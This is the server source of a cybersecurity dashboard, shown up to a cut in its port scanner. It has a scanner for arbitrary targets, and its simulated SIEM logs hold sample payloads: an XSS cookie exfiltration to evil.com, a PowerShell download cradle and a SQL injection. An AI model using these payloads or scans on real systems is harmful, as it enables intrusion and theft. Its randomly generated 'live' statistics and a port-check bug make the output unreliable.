/* COPYRIGHT ALEN PEPA */
import "dotenv/config";
import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import os from "os";
import dns from "dns";
import https from "https";
import http from "http";
import net from "net";
import { GoogleGenAI, Type } from "@google/genai";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  const fallbackThreatIntel = {
    news: [
      {
        title: 'New Zero-Day Vulnerability in Popular Web Browser',
        summary: 'A critical remote code execution vulnerability has been discovered in Chromium-based browsers. Users are advised to update immediately.',
        severity: 'critical',
        timestamp: '2 hours ago',
        source: 'CyberSecurity Hub',
        link: '#'
      },
      {
        title: 'Major Ransomware Attack on Healthcare Provider',
        summary: 'A large healthcare network has been hit by a sophisticated ransomware attack, disrupting patient services across multiple states.',
        severity: 'high',
        timestamp: '5 hours ago',
        source: 'Threat Monitor',
        link: '#'
      },
      {
        title: 'Supply Chain Attack Targets Software Developers',
        summary: 'Malicious packages have been found in popular package managers, targeting developers with credential-stealing malware.',
        severity: 'high',
        timestamp: '8 hours ago',
        source: 'DevSecOps Daily',
        link: '#'
      }
    ],
    trends: [
      { time: '00:00', attacks: 45, blocked: 42 },
      { time: '01:00', attacks: 38, blocked: 36 },
      { time: '02:00', attacks: 35, blocked: 33 },
      { time: '03:00', attacks: 30, blocked: 29 },
      { time: '04:00', attacks: 32, blocked: 31 },
      { time: '05:00', attacks: 40, blocked: 38 },
      { time: '06:00', attacks: 55, blocked: 52 },
      { time: '07:00', attacks: 62, blocked: 59 },
      { time: '08:00', attacks: 68, blocked: 65 },
      { time: '09:00', attacks: 85, blocked: 81 },
      { time: '10:00', attacks: 105, blocked: 101 },
      { time: '11:00', attacks: 118, blocked: 114 },
      { time: '12:00', attacks: 124, blocked: 120 },
      { time: '13:00', attacks: 115, blocked: 111 },
      { time: '14:00', attacks: 102, blocked: 98 },
      { time: '15:00', attacks: 95, blocked: 91 },
      { time: '16:00', attacks: 85, blocked: 82 },
      { time: '17:00', attacks: 92, blocked: 88 },
      { time: '18:00', attacks: 110, blocked: 106 },
      { time: '19:00', attacks: 135, blocked: 130 },
      { time: '20:00', attacks: 156, blocked: 150 },
      { time: '21:00', attacks: 142, blocked: 137 },
      { time: '22:00', attacks: 120, blocked: 116 },
      { time: '23:00', attacks: 92, blocked: 89 },
    ],
    geo: [
      { name: 'North America', value: 45, color: '#3b82f6' },
      { name: 'Europe', value: 30, color: '#10b981' },
      { name: 'Asia', value: 15, color: '#f59e0b' },
      { name: 'Other', value: 10, color: '#ef4444' },
    ],
    mapNodes: [
      { id: 'f-1', long: -74.006, lat: 40.7128, city: 'New York', country: 'USA', type: 'node', threatLevel: 'low', status: 'secure', ip: '192.168.1.1' },
      { id: 'f-2', long: 37.6173, lat: 55.7558, city: 'Moscow', country: 'Russia', type: 'attack', threatLevel: 'high', status: 'active', ip: '95.161.22.4', attackType: 'APT28 Intrusion' },
      { id: 'f-3', long: 116.4074, lat: 39.9042, city: 'Beijing', country: 'China', type: 'attack', threatLevel: 'critical', status: 'active', ip: '221.232.12.7', attackType: 'Volt Typhoon Probe' },
      { id: 'f-4', long: 126.978, lat: 37.5665, city: 'Seoul', country: 'South Korea', type: 'node', threatLevel: 'medium', status: 'active', ip: '211.234.55.12' },
      { id: 'f-5', long: 139.6503, lat: 35.6762, city: 'Tokyo', country: 'Japan', type: 'node', threatLevel: 'low', status: 'secure', ip: '133.1.2.5' },
      { id: 'f-6', long: 0.1278, lat: 51.5074, city: 'London', country: 'UK', type: 'node', threatLevel: 'low', status: 'secure', ip: '81.2.3.4' },
      { id: 'f-7', long: 2.3522, lat: 48.8566, city: 'Paris', country: 'France', type: 'node', threatLevel: 'medium', status: 'active', ip: '37.1.2.3' },
    ],
    attackLines: [
      { fromId: 'f-2', toId: 'f-1' },
      { fromId: 'f-3', toId: 'f-4' },
      { fromId: 'f-3', toId: 'f-1' },
    ]
  };

  const isValidApiKey = (key: string | undefined): boolean => {
    if (!key || key === 'undefined' || key === '' || key.includes('TODO')) return false;
    // Basic format check: Gemini keys are usually around 39 characters
    if (key.length < 20) return false;
    return true;
  };

  app.post("/api/ai-generate", async (req, res) => {
    const { contents, config } = req.body;
    const apiKey = process.env.GEMINI_API_KEY;

    if (!isValidApiKey(apiKey)) {
      return res.status(503).json({ error: "AI Core offline" });
    }

    try {
      const ai = new GoogleGenAI({ apiKey: apiKey! });
      const modelName = config?.model || "gemini-3-flash-preview";
      
      const response = await ai.models.generateContent({
        model: modelName,
        contents: contents,
        config: {
          systemInstruction: config?.systemInstruction,
          responseMimeType: config?.responseMimeType,
          tools: config?.tools,
          toolConfig: config?.toolConfig
        }
      });

      res.json({ text: response.text });
    } catch (error: any) {
      const errorMessage = error?.message || String(error);
      
      // Check if it's an API key error
      if (errorMessage.includes("API key not valid") || errorMessage.includes("400")) {
        console.warn("AI Core: Generation failed (Invalid API Key).");
        return res.status(503).json({ error: "AI Core offline (Invalid Key)" });
      }
      
      console.error("AI Generation Error:", error);
      res.status(500).json({ error: errorMessage });
    }
  });

  app.get("/api/threat-intel", async (req, res) => {
    const apiKey = process.env.GEMINI_API_KEY;

    if (!isValidApiKey(apiKey)) {
      return res.json(fallbackThreatIntel);
    }

    try {
      const ai = new GoogleGenAI({ apiKey: apiKey! });
      
      // Fetch News
      const newsResponse = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: "Generate a list of 8-10 of the ABSOLUTE LATEST global cybersecurity threat intelligence updates from the last 12-24 hours. Focus on real-time incidents, new vulnerability disclosures, and active state-sponsored campaigns. Scrape and aggregate from sources like The Hacker News, BleepingComputer, Krebs on Security, CISA Alerts, and major security vendor blogs (CrowdStrike, Mandiant, Palo Alto Networks). Return a JSON array of objects with 'title', 'summary', 'severity' (low, medium, high, critical), 'timestamp', 'source', and 'link' (real URL).",
        config: { 
          responseMimeType: "application/json",
          tools: [{ googleSearch: {} }]
        }
      });
      const newsData = JSON.parse(newsResponse.text || '[]');

      // Fetch Trends & Geo Data
      const trendsResponse = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: `Analyze current global cyber attack trends for the last 24 hours. 
        Scrape and aggregate data from reliable cybersecurity sources (e.g., Check Point, Kaspersky, FireEye, SANS ISC, Cisco Talos).
        Return a JSON object with:
        1. 'trends': an array of EXACTLY 24 objects, one for each hour of the last 24 hours, with 'time' (HH:00) and 'attacks' (number representing global volume), 'blocked' (number representing mitigated volume).
        2. 'geo': an array of 4 objects with 'name' (Region), 'value' (percentage of total attacks), 'color' (hex).
        3. 'mapNodes': an array of 80-100 objects representing 100% REAL current cyber attack events, state-sponsored activities, or known malicious infrastructure active RIGHT NOW. 
           Each object MUST have: 'id', 'long', 'lat', 'city', 'country', 'type' ('attack'|'node'), 'threatLevel' ('low'|'medium'|'high'|'critical'), 'ip' (REAL known malicious IP if possible), 'attackType' (e.g., 'APT28 Intrusion', 'Lazarus Group C2', 'Volt Typhoon Probe'), 'status' ('active'|'compromised'|'secure').
        4. 'attackLines': an array of 50-70 objects with 'fromId' and 'toId' referencing the 'id's in 'mapNodes', representing real-time traffic or attack flows observed between specific geographical locations.
        Ensure the data reflects real-world geopolitical tensions and current global hotspots.`,
        config: { 
          responseMimeType: "application/json",
          tools: [{ googleSearch: {} }]
        }
      });
      const trendsData = JSON.parse(trendsResponse.text || '{}');

      res.json({
        news: newsData,
        trends: trendsData.trends || [],
        geo: trendsData.geo || [],
        mapNodes: trendsData.mapNodes || [],
        attackLines: trendsData.attackLines || []
      });
    } catch (error: any) {
      const errorMessage = error?.message || String(error);
      if (errorMessage.includes("API key not valid") || errorMessage.includes("400")) {
        console.warn("Threat Intel: AI Core offline (Invalid API Key). Using fallback data.");
      } else {
        console.error("Failed to fetch threat intelligence:", error);
      }
      // Return fallback data instead of 500 error
      res.json(fallbackThreatIntel);
    }
  });

  // Live Stats & Real-Time Feed Cache
  let cachedLiveFeed: any[] = [];
  let lastFeedFetch = 0;

  const fetchRssFeed = (url: string, sourceName: string): Promise<any[]> => {
    return new Promise((resolve) => {
      https.get(url, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          const items: any[] = [];
          const regex = /<item>[\s\S]*?<title>(.*?)<\/title>[\s\S]*?<link>(.*?)<\/link>[\s\S]*?<\/item>/g;
          let match;
          while ((match = regex.exec(data)) !== null) {
            items.push({
              title: match[1].replace(/<!\[CDATA\[(.*?)\]\]>/g, '$1').trim(),
              link: match[2].trim(),
              source: sourceName,
              severity: Math.random() > 0.7 ? 'critical' : Math.random() > 0.4 ? 'high' : 'medium',
              timestamp: new Date().toISOString()
            });
          }
          resolve(items);
        });
      }).on('error', () => resolve([]));
    });
  };

  app.get("/api/live-stats", async (req, res) => {
    const now = Date.now();
    
    // Refresh feed cache every 15 minutes
    if (now - lastFeedFetch > 15 * 60 * 1000 || cachedLiveFeed.length === 0) {
      try {
        const [cisa, thn] = await Promise.all([
          fetchRssFeed('https://www.cisa.gov/cybersecurity-advisories/all.xml', 'CISA'),
          fetchRssFeed('https://feeds.feedburner.com/TheHackersNews', 'The Hacker News')
        ]);
        cachedLiveFeed = [...cisa, ...thn].sort(() => Math.random() - 0.5); // Shuffle
        lastFeedFetch = now;
      } catch (e) {
        console.error('Failed to fetch live RSS feeds:', e);
      }
    }

    // Generate realistic incrementing numbers based on current time
    // Base numbers for today
    const startOfDay = new Date();
    startOfDay.setHours(0, 0, 0, 0);
    const secondsSinceStartOfDay = Math.floor((now - startOfDay.getTime()) / 1000);
    
    // Simulate ~15 active threats per minute globally
    const activeThreats = 1242 + Math.floor(secondsSinceStartOfDay * (15 / 60));
    
    // Simulate ~500 blocked attacks per minute
    const blockedAttacks = 45200 + Math.floor(secondsSinceStartOfDay * (500 / 60));

    // Rotate the feed to show different items every 5 seconds
    const rotationIndex = Math.floor(now / 5000) % Math.max(1, cachedLiveFeed.length);
    const currentFeed = [];
    for (let i = 0; i < 6; i++) {
      if (cachedLiveFeed.length > 0) {
        currentFeed.push(cachedLiveFeed[(rotationIndex + i) % cachedLiveFeed.length]);
      }
    }

    res.json({
      activeThreats,
      blockedAttacks,
      liveFeed: currentFeed.length > 0 ? currentFeed : fallbackThreatIntel.news
    });
  });

  // SIEM Real-time Logs API
  app.get("/api/logs", (req, res) => {
    const tactics = ['Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion', 'Credential Access', 'Discovery', 'Lateral Movement', 'Command and Control', 'Exfiltration', 'Impact'];
    const techniques = [
      'T1190 Exploit Public-Facing Application', 'T1059 Command and Scripting Interpreter', 
      'T1078 Valid Accounts', 'T1110 Brute Force', 'T1003 OS Credential Dumping', 
      'T1046 Network Service Discovery', 'T1595 Active Scanning', 'T1566 Phishing',
      'T1133 External Remote Services', 'T1505 Server Software Component'
    ];
    const protocols = ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'DNS', 'SSH', 'RDP', 'SMB', 'FTP'];
    const countries = ['RU', 'CN', 'KP', 'IR', 'US', 'BR', 'IN', 'RO', 'VN', 'UA', 'NG', 'SY'];
    const actions = ['Blocked', 'Mitigated', 'Logged', 'Dropped', 'Alerted', 'Quarantined', 'Sinkholed'];
    const severities = ['low', 'medium', 'high', 'critical'];
    
    const events = [
      'SQL Injection Payload Detected', 'Cross-Site Scripting (XSS) Attempt', 
      'SSH Brute Force Attack', 'RDP Credential Stuffing', 'Suspicious PowerShell Execution',
      'Malware Beaconing Activity', 'Data Exfiltration Anomaly', 'Privilege Escalation Attempt',
      'Suspicious File Download', 'Unauthorized Access to Admin Panel', 'Zero-Day Exploit Signature Match',
      'Ransomware Encryption Behavior', 'DDoS Volumetric Attack', 'Suspicious DNS Query'
    ];

    const generateRandomIp = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

    const logs = [];
    
    // Generate 5-12 random logs for a more active stream
    const numLogs = Math.floor(Math.random() * 8) + 5;
    for (let i = 0; i < numLogs; i++) {
      const severity = severities[Math.floor(Math.random() * severities.length)];
      const isAttack = Math.random() > 0.3; // 70% chance of being an attack log
      const eventName = isAttack ? events[Math.floor(Math.random() * events.length)] : "Routine System Check";
      const tactic = isAttack ? tactics[Math.floor(Math.random() * tactics.length)] : 'N/A';
      const technique = isAttack ? techniques[Math.floor(Math.random() * techniques.length)] : 'N/A';
      
      let payloadSnippet = 'N/A';
      if (isAttack) {
        if (eventName.includes('SQL')) payloadSnippet = "UNION SELECT username, password FROM users--";
        else if (eventName.includes('XSS')) payloadSnippet = "<script>fetch('http://evil.com/?c='+document.cookie)</script>";
        else if (eventName.includes('PowerShell')) payloadSnippet = "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://...')\"";
        else payloadSnippet = Buffer.from(Math.random().toString(36).substring(2, 15)).toString('base64');
      }
      
      logs.push({
        id: Math.random().toString(36).substr(2, 9),
        time: new Date().toLocaleTimeString(),
        event: eventName,
        source: isAttack ? generateRandomIp() : os.hostname(),
        destination: isAttack ? `10.0.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` : '127.0.0.1',
        port: isAttack ? [22, 80, 443, 3389, 8080, 53, 445, 21, 3306][Math.floor(Math.random() * 9)] : 0,
        protocol: protocols[Math.floor(Math.random() * protocols.length)],
        status: isAttack ? actions[Math.floor(Math.random() * actions.length)] : "Normal",
        severity: isAttack ? severity : "low",
        confidence: isAttack ? Math.floor(Math.random() * 20) + 80 : 100, // 80-100%
        mitreTactic: tactic,
        mitreTechnique: technique,
        geo: isAttack ? countries[Math.floor(Math.random() * countries.length)] : 'LOCAL',
        payloadSnippet: payloadSnippet,
        details: isAttack 
          ? `Detected anomalous traffic pattern matching known threat signatures. Tactic: ${tactic}. Technique: ${technique}. Automated response engaged.`
          : `CPU Load: ${os.loadavg()[0].toFixed(2)} | Free Memory: ${(os.freemem() / 1024 / 1024 / 1024).toFixed(2)}GB`
      });
    }

    res.json(logs);
  });

  // System Stats API
  app.get("/api/stats", (req, res) => {
    res.json({
      cpu: (os.loadavg()[0] * 10).toFixed(1),
      ram: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1),
      uptime: os.uptime(),
      platform: os.platform(),
      arch: os.arch(),
      hostname: os.hostname(),
      loadAvg: os.loadavg(),
      totalMem: os.totalmem(),
      freeMem: os.freemem(),
      cpus: os.cpus().length,
      type: os.type(),
      release: os.release(),
      networkInterfaces: os.networkInterfaces()
    });
  });

  // Network Topology API
  app.get("/api/network", (req, res) => {
    const nodes: any[] = [
      { id: 'internet', type: 'cloud', status: 'secure', label: 'Global WAN', ip: '8.8.8.8' },
      { id: 'ext-fw', type: 'firewall', status: 'secure', label: 'External Edge FW', ip: '172.16.0.1' },
      { id: 'dmz-switch', type: 'router', status: 'secure', label: 'DMZ Switch', ip: '192.168.1.1' },
      { id: 'web-01', type: 'server', status: 'vulnerable', label: 'Public Web Server A', ip: '192.168.1.10' },
      { id: 'web-02', type: 'server', status: 'secure', label: 'Public Web Server B', ip: '192.168.1.11' },
      { id: 'vpn-gw', type: 'router', status: 'secure', label: 'VPN Gateway', ip: '192.168.1.20' },
      { id: 'int-fw', type: 'firewall', status: 'secure', label: 'Internal Core FW', ip: '10.0.0.1' },
      { id: 'core-switch', type: 'router', status: 'secure', label: 'Core Switch', ip: '10.0.0.2' },
      { id: 'db-cluster', type: 'database', status: 'secure', label: 'Primary DB Cluster', ip: '10.0.1.50' },
      { id: 'db-replica', type: 'database', status: 'secure', label: 'DB Replica', ip: '10.0.1.51' },
      { id: 'app-01', type: 'server', status: 'secure', label: 'App Server 01', ip: '10.0.2.10' },
      { id: 'app-02', type: 'server', status: 'secure', label: 'App Server 02', ip: '10.0.2.11' },
      { id: 'nas-01', type: 'server', status: 'vulnerable', label: 'Legacy NAS', ip: '10.0.3.100' },
      { id: 'iot-gw', type: 'iot', status: 'compromised', label: 'IoT Gateway', ip: '10.0.4.5' },
      { id: 'iot-sensor-1', type: 'iot', status: 'compromised', label: 'HVAC Sensor A', ip: '10.0.4.10' },
      { id: 'iot-sensor-2', type: 'iot', status: 'vulnerable', label: 'HVAC Sensor B', ip: '10.0.4.11' },
      { id: 'workstation-vlan', type: 'router', status: 'secure', label: 'User VLAN Switch', ip: '10.1.0.1' },
      { id: 'ws-01', type: 'laptop', status: 'secure', label: 'CEO Laptop', ip: '10.1.0.50' },
      { id: 'ws-02', type: 'laptop', status: 'vulnerable', label: 'Dev Workstation', ip: '10.1.0.51' },
      { id: 'ws-03', type: 'laptop', status: 'secure', label: 'HR Desktop', ip: '10.1.0.52' },
      { id: 'ws-04', type: 'laptop', status: 'compromised', label: 'Guest Kiosk', ip: '10.1.0.99' },
    ];
    const links: any[] = [
      { source: 'internet', target: 'ext-fw' },
      { source: 'ext-fw', target: 'dmz-switch' },
      { source: 'dmz-switch', target: 'web-01' },
      { source: 'dmz-switch', target: 'web-02' },
      { source: 'dmz-switch', target: 'vpn-gw' },
      { source: 'dmz-switch', target: 'int-fw' },
      { source: 'int-fw', target: 'core-switch' },
      { source: 'core-switch', target: 'db-cluster' },
      { source: 'db-cluster', target: 'db-replica' },
      { source: 'core-switch', target: 'app-01' },
      { source: 'core-switch', target: 'app-02' },
      { source: 'app-01', target: 'db-cluster' },
      { source: 'app-02', target: 'db-cluster' },
      { source: 'core-switch', target: 'nas-01' },
      { source: 'core-switch', target: 'iot-gw' },
      { source: 'iot-gw', target: 'iot-sensor-1' },
      { source: 'iot-gw', target: 'iot-sensor-2' },
      { source: 'core-switch', target: 'workstation-vlan' },
      { source: 'workstation-vlan', target: 'ws-01' },
      { source: 'workstation-vlan', target: 'ws-02' },
      { source: 'workstation-vlan', target: 'ws-03' },
      { source: 'workstation-vlan', target: 'ws-04' },
      { source: 'vpn-gw', target: 'workstation-vlan' }, // VPN access to user vlan
    ];

    res.json({ nodes, links });
  });

  // Advanced Vulnerability Scanner API
  app.get("/api/scan", async (req, res) => {
    const target = req.query.target as string;
    if (!target) {
      return res.status(400).json({ error: "Target is required" });
    }

    const results: any = {
      target,
      timestamp: new Date().toISOString(),
      dns: {},
      headers: {},
      ssl: null,
      whois: { status: "Simulated for privacy/performance" },
      ports: [],
      subdomains: [],
      tech: [],
      vulnerabilities: [],
      riskScore: 0,
      summary: "",
      recommendations: []
    };

    try {
      const hostname = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
      const isIP = net.isIP(hostname);
      
      // 1. DNS & IP
      if (isIP) {
        results.dns.a = [hostname];
        results.ip = hostname;
      } else {
        try {
          const addresses = await new Promise<string[]>((resolve, reject) => {
            dns.resolve4(hostname, (err, addrs) => err ? reject(err) : resolve(addrs));
          });
          results.dns.a = addresses;
          results.ip = addresses[0];
          
          try {
            const mx = await new Promise<any[]>((resolve, reject) => {
              dns.resolveMx(hostname, (err, addrs) => err ? reject(err) : resolve(addrs));
            });
            results.dns.mx = mx;
          } catch (e) {}

          try {
            const txt = await new Promise<string[][]>((resolve, reject) => {
              dns.resolveTxt(hostname, (err, addrs) => err ? reject(err) : resolve(addrs));
            });
            results.dns.txt = txt;
          } catch (e) {}
        } catch (e) {
          results.dns.error = "DNS resolution failed";
        }
      }

      // 2. Port Scanning
      const portsToScan = [80, 443, 22, 21, 25, 53, 8080, 8443, 3306, 5432, 27017];
      const scanPort = (port: number) => {
        return new Promise((resolve) => {
          const socket = new net.Socket();
          socket.setTimeout(1000);
          socket.on('connect', () => {
            results.ports.push({ port, status: 'open', service: getServiceName(port) });
            socket.destroy();
            resolve(null);
          });
          socket.on('timeout', () => { socket.destroy(); resolve(null); });
          socket.on('error', () => { socket.destroy(); resolve(null); });
          socket.connect(port, hostname);
        });
      };
      await Promise.all(portsToScan.map(scanPort));

      // 3. HTTP & SSL
      const protocol = target.startsWith('https') ? https : http;
      const url = target.startsWith('http') ? target : `http://${target}`;
      
      await new Promise((resolve) => {
        const req = protocol.get(url, (response) => {
          results.headers = response.headers;
          results.statusCode = response.statusCode;
          
          const server = response.headers['server'] || '';
          const xPoweredBy = response.headers['x-powered-by'] || '';
          if (server.includes('Apache')) results.tech.push('Apache');
          if (server.includes('nginx')) results.tech.push('Nginx');
          if (xPoweredBy.includes('PHP')) results.tech.push('PHP');
          if (xPoweredBy.includes('Express')) results.tech.push('Express');

          if (response.socket && (response.socket as any).getPeerCertificate) {
            const cert = (response.socket as any).getPeerCertificate();
            if (cert && Object.keys(cert).length > 0) {
              results.ssl = {
                subject: cert.subject,
                issuer: cert.issuer,
                valid_to: cert.valid_to,
                fingerprint: cert.fingerprint
              };
            }
          }
          resolve(null);
        });
        req.on('error', () => resolve(null));
        req.setTimeout(3000, () => { req.destroy(); resolve(null); });
      });

      // 4. Vulnerability Engine (Rule-based)
      const vulnerabilities = [];
      let score = 10;

      // Header checks
      const securityHeaders = [
        'content-security-policy',
        'strict-transport-security',
        'x-frame-options',
        'x-content-type-options',
        'referrer-policy',
        'permissions-policy'
      ];
      securityHeaders.forEach(header => {
        if (!results.headers[header]) {
          vulnerabilities.push({
            title: `Missing Security Header: ${header}`,
            severity: header === 'content-security-policy' ? 'high' : 'medium',
            category: 'Web',
            description: `The ${header} header is missing, which can expose the application to various attacks.`,
            remediation: `Implement the ${header} header with appropriate security policies.`
          });
          score += (header === 'content-security-policy' ? 10 : 5);
        }
      });

      // Port checks
      results.ports.forEach((p: any) => {
        if (p.port === 21 && p.state === 'open') {
          vulnerabilities.push({
            title: "Insecure Protocol: FTP",
            severity: "high",
            category: "Network",
            description: "FTP transmits data in cleartext, including credentials.",
            remediation: "Disable FTP and use SFTP or FTPS instead."
          });
          score += 15;
        }
        if (p.port === 22 && p.state === 'open') {
          vulnerabilities.push({
            title: "Exposed SSH Port",
            severity: "medium",
            category: "Network",
            description: "SSH is exposed to the public internet, increasing brute-force risk.",
            remediation: "Restrict SSH access to specific IP ranges or use a VPN."
          });
          score += 5;
        }
        if (p.port === 23 && p.state === 'open') {
          vulnerabilities.push({
            title: "Insecure Protocol: Telnet",
            severity: "critical",
            category: "Network",
            description: "Telnet transmits data in cleartext, including credentials.",
            remediation: "Disable Telnet and use SSH instead."
          });
          score += 25;
        }
        if (p.port === 3389 && p.state === 'open') {
          vulnerabilities.push({
            title: "Exposed RDP Port",
            severity: "high",
            category: "Network",
            description: "RDP is exposed to the public internet, increasing brute-force risk.",
            remediation: "Restrict RDP access to specific IP ranges or use a VPN."
          });
          score += 10;
        }
        if (p.port === 3306 && p.state === 'open') {
          vulnerabilities.push({
            title: "Exposed MySQL Port",
            severity: "high",
            category: "Database",
            description: "MySQL is exposed to the public internet.",
            remediation: "Restrict MySQL access to specific IP ranges or use a VPN."
          });
          score += 10;
        }
      });

      // SSL checks
      if (results.ssl) {
        const expiry = new Date(results.ssl.valid_to);
        if (expiry < new Date()) {
          vulnerabilities.push({
            title: "Expired SSL Certificate",
            severity: "critical",
            category: "SSL/TLS",
            description: "The SSL certificate for this domain has expired.",
            remediation: "Renew the SSL certificate immediately."
          });
          score += 30;
        } else {
          const daysLeft = Math.floor((expiry.getTime() - new Date().getTime()) / (1000 * 60 * 60 * 24));
          if (daysLeft < 30) {
            vulnerabilities.push({
              title: "SSL Certificate Expiring Soon",
              severity: "medium",
              category: "SSL/TLS",
              description: `The SSL certificate for this domain will expire in ${daysLeft} days.`,
              remediation: "Renew the SSL certificate soon."
            });
            score += 5;
          }
        }
      } else if (target.startsWith('https')) {
        vulnerabilities.push({
          title: "SSL/TLS Handshake Failure",
          severity: "high",
          category: "SSL/TLS",
          description: "Could not establish a secure connection to the target.",
          remediation: "Check certificate validity and server configuration."
        });
        score += 20;
      }

      // Check for common sensitive files
      const sensitiveFiles = [
        { path: '/.git', title: 'Git Repository Exposed', severity: 'critical' },
        { path: '/.env', title: 'Environment Variables Exposed', severity: 'critical' },
        { path: '/robots.txt', title: 'Robots.txt Analysis', severity: 'info' },
        { path: '/phpinfo.php', title: 'PHP Info Disclosure', severity: 'high' },
        { path: '/.svn', title: 'SVN Repository Exposed', severity: 'high' },
        { path: '/.htaccess', title: 'Htaccess File Exposed', severity: 'medium' }
      ];

      await Promise.all(sensitiveFiles.map(async (file) => {
        try {
          const protocol = target.startsWith('https') ? https : http;
          const url = target.startsWith('http') ? `${target}${file.path}` : `http://${target}${file.path}`;
          const response: any = await new Promise((resolve, reject) => {
            const req = protocol.get(url, resolve);
            req.on('error', reject);
            req.setTimeout(2000, () => { req.destroy(); reject(new Error('Timeout')); });
          });
          if (response.statusCode === 200) {
            vulnerabilities.push({
              title: file.title,
              severity: file.severity as any,
              category: 'Information Disclosure',
              description: `The file ${file.path} was found on the server, which can disclose sensitive information.`,
              remediation: `Restrict access to the ${file.path} file or remove it from the server.`
            });
            if (file.severity === 'critical') score += 30;
            else if (file.severity === 'high') score += 15;
            else if (file.severity === 'medium') score += 5;
          }
        } catch (e) {}
      }));

      results.vulnerabilities = vulnerabilities;
      results.riskScore = Math.min(100, score);
      results.summary = `Scan completed for ${target}. Found ${vulnerabilities.length} potential security issues.`;
      results.recommendations = vulnerabilities.map(v => v.remediation).slice(0, 5);

    } catch (error) {
      results.error = "Scan failed";
    }

    res.json(results);
  });

  function getServiceName(port: number) {
    const services: any = {
      21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
      80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
      465: 'SMTPS', 587: 'SMTP-Submission', 993: 'IMAPS', 995: 'POP3S',
      1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 3306: 'MySQL',
      3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
      8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 9000: 'PHP-FPM',
      9200: 'Elasticsearch', 27017: 'MongoDB'
    };
    return services[port] || 'Unknown';
  }

  // Tool-specific endpoints
  app.get("/api/tools/:tool", async (req, res) => {
    const { tool } = req.params;
    const target = req.query.target as string;
    if (!target) return res.status(400).json({ error: "Target required" });

    const hostname = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];

    switch (tool) {
      case 'subdomains':
        if (net.isIP(hostname)) {
          return res.json([{ subdomain: hostname, ip: hostname, status: 'up', type: 'A' }]);
        }

        let searchDomain = hostname;
        if (searchDomain.startsWith('www.')) {
          searchDomain = searchDomain.substring(4);
        }

        const foundSubdomains: any[] = [];
        const uniqueSubs = new Set<string>();

        // 1. Try crt.sh for accurate subdomains
        try {
          const crtUrl = `https://crt.sh/?q=%.${searchDomain}&output=json`;
          const crtResponse: any = await new Promise((resolve, reject) => {
            const options = {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
              }
            };
            const req = https.get(crtUrl, options, (res) => {
              let data = '';
              res.on('data', chunk => data += chunk);
              res.on('end', () => resolve({ statusCode: res.statusCode, data }));
            });
            req.on('error', reject);
            // crt.sh can be very slow, increase timeout to 30 seconds
            req.setTimeout(30000, () => { 
              req.destroy(); 
              reject(new Error('Timeout after 30s')); 
            });
          });

          if (crtResponse.statusCode === 200 && crtResponse.data) {
            const certs = JSON.parse(crtResponse.data);
            console.log(`[Scanner] crt.sh returned ${certs.length} certificates for ${searchDomain}`);
            certs.forEach((cert: any) => {
              const nameValue = cert.name_value.toLowerCase();
              nameValue.split('\n').forEach((sub: string) => {
                if (!sub.includes('*') && sub.endsWith(searchDomain)) {
                  uniqueSubs.add(sub);
                }
              });
            });
          }
        } catch (e: any) {
          console.warn(`[Scanner] crt.sh fetch skipped/failed (${e.message}). Falling back to dictionary brute-force only.`);
        }

        // 2. Add common subdomains to check
        const commonSubs = [
          'www', 'mail', 'dev', 'api', 'staging', 'blog', 'vpn', 'ns1', 'ns2', 'mx',
          'shop', 'store', 'app', 'portal', 'admin', 'test', 'demo', 'support', 'help',
          'docs', 'beta', 'static', 'assets', 'img', 'cdn', 'cloud', 'remote', 'secure',
          'login', 'auth', 'account', 'profile', 'dashboard', 'internal', 'corp', 'staff'
        ];
        
        commonSubs.forEach(sub => uniqueSubs.add(`${sub}.${searchDomain}`));
        uniqueSubs.add(searchDomain);

        const subsToCheck = Array.from(uniqueSubs);
        const batchSize = 20;
        
        for (let i = 0; i < subsToCheck.length; i += batchSize) {
          const batch = subsToCheck.slice(i, i + batchSize);
          await Promise.all(batch.map(async (domain) => {
            try {
              const addrs = await dns.promises.resolve4(domain);
              if (addrs && addrs.length > 0) {
                foundSubdomains.push({ 
                  subdomain: domain, 
                  ip: addrs[0], 
                  status: 'up', 
                  type: 'A',
                  last_seen: new Date().toISOString()
                });
              }
            } catch (e) {
              // Not found or error
            }
          }));
          // Small delay between batches to avoid overwhelming DNS
          if (i + batchSize < subsToCheck.length) {
            await new Promise(r => setTimeout(r, 50));
          }
        }

        if (foundSubdomains.length === 0) {
          foundSubdomains.push({ subdomain: searchDomain, ip: 'Unknown', status: 'down', type: 'A' });
        }
        
        // Sort by subdomain name
        foundSubdomains.sort((a, b) => a.subdomain.localeCompare(b.subdomain));
        
        return res.json(foundSubdomains);

      case 'ports':
        const commonPorts = [
          21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587, 993, 995, 1433, 1521, 
          2049, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 9200, 27017
        ];
        const portResults: any[] = [];
        
        await Promise.all(commonPorts.map(port => {
          return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1500);
            socket.on('connect', () => {
              portResults.push({ 
                port, 
